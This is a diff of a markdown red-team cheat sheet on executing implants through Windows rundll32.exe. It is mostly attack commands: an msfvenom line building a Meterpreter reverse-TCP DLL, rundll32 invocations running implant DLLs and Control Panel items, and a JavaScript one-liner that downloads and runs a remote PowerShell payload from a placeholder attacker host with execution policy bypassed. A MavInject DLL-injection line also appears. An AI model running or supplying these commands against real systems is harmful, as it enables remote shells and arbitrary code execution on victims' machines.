@@ -12,16 +12,32 @@ tags:
 ---
 # DLL Execution
 
+## `rundll32.exe`
+
 Generate a DLL implant.
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o implant.dll
 ```
 
-## `rundll32.exe`
+Then execute it with `StartW` entry point.
 
 ```
 C:\> rundll32.exe implant.dll,StartW
+```
+
+To execute the **Control Panel Items** (`.cpl`) implant with entry point either `Control_RunDLL` or `Control_RunDLLAsuser`.
+
+```
+C:\> rundll32.exe shell32.dll,Control_RunDLL implant.cpl
+
+C:\> rundll32.exe shell32.dll,Control_RunDLLAsuser implant.cpl
+```
+
+A custom implant can be compiled using the `.cpl` Windows features.
+
+```
+C:\> rundll32.exe implant.dll,Control_RunDLL
 ```
 
 Execute a JavaScript that runs a PowerShell script that is downloaded from a remote web site.
@@ -30,7 +46,7 @@ Execute a JavaScript that runs a PowerShell script that is downloaded from a rem
 C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http[s]://<IP>[:PORT]/implant.ps1')");
 ```
 
-Execute a JavaScript that runs calc.exe and then kills the Rundll32.exe process that was started.
+Execute a JavaScript that runs `calc.exe` and then kills the `rundll32.exe` process that was started.
 
 ```
 C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe", 0, true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
@@ -215,3 +231,7 @@ C:\> MavInject.exe <pid> /INJECTRUNNING C:\path\to\implant.dll
 - [Red Team Notes: Control Panel Item](https://www.ired.team/offensive-security/code-execution/t1196-control-panel-item-code-execution)
 
 - [Red Team Notes: Forcing `iexplore.exe` to Load a Malicious DLL via COM Abuse](https://www.ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse)
+
+### DMCXBlue
+
+- [DMCXBlue: Rundll32](https://dmcxblue.gitbook.io/red-team-notes/execution/untitled)
